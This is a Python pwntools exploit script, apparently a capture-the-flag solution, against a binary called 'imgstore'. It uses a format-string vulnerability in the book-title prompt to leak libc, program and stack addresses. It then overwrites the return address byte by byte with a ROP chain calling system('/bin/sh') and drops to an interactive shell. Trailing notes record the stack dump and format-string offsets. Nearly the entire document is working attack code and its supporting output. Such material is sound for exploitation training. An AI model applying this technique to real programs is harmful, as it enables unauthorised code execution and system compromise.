from pwn import *
from struct import pack

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./imgstore", )
elf = context.binary = ELF("./imgstore", checksec=False)

libc = ELF('./libc.so.6')

context.log_level = 'info'

pause()	
io.recvuntil(b'>> ')
io.sendline(b'3')

io.recvuntil(b'Enter book title: ')
io.sendline(b'%25$p elf:%14$p rbp:%18$p')

io.recvuntil(b'--> ')
libc_leak = int(io.recv(14),16)
io.recvuntil(b'elf:')
elf_leak = int(io.recv(14),16)
io.recvuntil(b'rbp:')
rbp_leak = int(io.recv(14),16)

print(f"libc_leak: {hex(libc_leak)}")
print(f"elf_leak: {hex(elf_leak)}")
print(f"rbp_leak: {hex(rbp_leak)}")


libc.address = libc_leak - 0x2083 - 139264
elf.address = elf_leak - 4784
return_addr = rbp_leak + 24

print(f"elf.address: {hex(elf.address)}")
print(f"libc.address: {hex(libc.address)}")
print(f"return_addr: {hex(return_addr)}")

ret = libc.address + 0x0000000000022679

pop_rdi = next(libc.search(asm('pop rdi; ret')))
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']


print(f"pop_rdi: {hex(pop_rdi)}")
print(f"bin_sh: {hex(bin_sh)}")
print(f"system: {hex(system)}")


# one_gadget= libc.address + 0xe3afe
# pop_rsi_r15 = next(libc.search(asm('pop rsi; pop r15; ret')))

# print(f"one_gadget: {hex(one_gadget)}")
# print(f"pop_rsi_r15: {hex(pop_rsi_r15)}")

# payload = fmtstr_payload(8, {return_addr: pop_rsi_r15}, write_size = 'int')

def send_format_string(fmt_string):
    io.recvuntil(b'[y/n]: ')
    io.sendline(b'y')
    io.recvuntil(b'Enter book title: ')
    io.sendline(fmt_string)

def arb_write_8(addr,data):
    payload = fmtstr_payload(8, {addr: data})
    send_format_string(payload)

def arb_write_64(addr,data):
    #Calculate all bytes to write
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    #Write everything one byte at a time
    for i in range(0,len(to_write)):
        arb_write_8(addr+i,to_write[i])


arb_write_64(return_addr, ret)
arb_write_64(return_addr+8, pop_rdi)
arb_write_64(return_addr+16, bin_sh)
arb_write_64(return_addr+24, system)

# arb_write_64(return_addr, ret)
# arb_write_64(return_addr+8, pop_rsi_r15)
# arb_write_64(return_addr+16, u64('\x00\x00\x00\x00\x00\x00\x00\x00'))
# arb_write_64(return_addr+24, u64('\x00\x00\x00\x00\x00\x00\x00\x00'))
# arb_write_64(return_addr+32, one_gadget)


io.interactive()
'''
notes
00:0000│ rsp     0x7fffffffdc28 —▸ 0x555555555eb0 ◂— lea rdi, [rip + 0x194c]
01:0008│-060     0x7fffffffdc30 —▸ 0x55555555a060 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
02:0010│-058     0x7fffffffdc38 ◂— 0x300001b31
03:0018│ rax rdi 0x7fffffffdc40 ◂— 0x0
04:0020│-048     0x7fffffffdc48 —▸ 0x7ffff7e65e93 (_IO_file_overflow+275) ◂— cmp eax, -1
05:0028│-040     0x7fffffffdc50 ◂— 0x0
06:0030│-038     0x7fffffffdc58 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-030     0x7fffffffdc60 —▸ 0x555555557008 ◂— 0x6d305b1b00
08:0040│-028     0x7fffffffdc68 —▸ 0x7ffff7e5959a (puts+378) ◂— cmp eax, -1
09:0048│-020     0x7fffffffdc70 —▸ 0x5555555562b0 ◂— endbr64 
0a:0050│-018     0x7fffffffdc78 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdcc0 ◂— 0x0
0b:0058│-010     0x7fffffffdc80 —▸ 0x5555555562b0 ◂— endbr64 
0c:0060│-008     0x7fffffffdc88 ◂— 0x8a9258c0cabb5e00
0d:0068│ rbp     0x7fffffffdc90 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdcc0 ◂— 0x0
0e:0070│+008     0x7fffffffdc98 —▸ 0x5555555561b8 ◂— jmp 0x555555556225
0f:0078│+010     0x7fffffffdca0 ◂— 0x300000000
10:0080│+018     0x7fffffffdca8 ◂— 0x8a9258c0cabb5e00
11:0088│+020     0x7fffffffdcb0 —▸ 0x7fffffffdcc0 ◂— 0x0
12:0090│+028     0x7fffffffdcb8 —▸ 0x5555555562a3 ◂— mov eax, 0
13:0098│+030     0x7fffffffdcc0 ◂— 0x0
14:00a0│+038         —▸ 0x7ffff7df9083 (__libc_start_main+243) ◂— mov edi, eax

%p %p %p %p %p %p %p %p %p
Book title --> 0x7fffffffb590 (nil) (nil) 0xf 0xf 0x55555555a060 0x3000020c5 0x7025207025207025 0x2520702520702520

read arg = 8

%9$p -> _IO_file_overflow+275
%15$p -> 0x7fffffffdcb0
%25$p -> __libc_start_main+243 0x2083
%14$p -> elf



offset 0x90e93 

onegadget 0xe3afe
[ 0xef, 0xbe, 0xed, 0xfe ]

RBP - input address

p 0x7ffd1a087060 - 0x7ffd1a086ff0
$4 = 112

p 0x7ffe909b8040 - 0x7ffe909b7fd0
$5 = 112

'''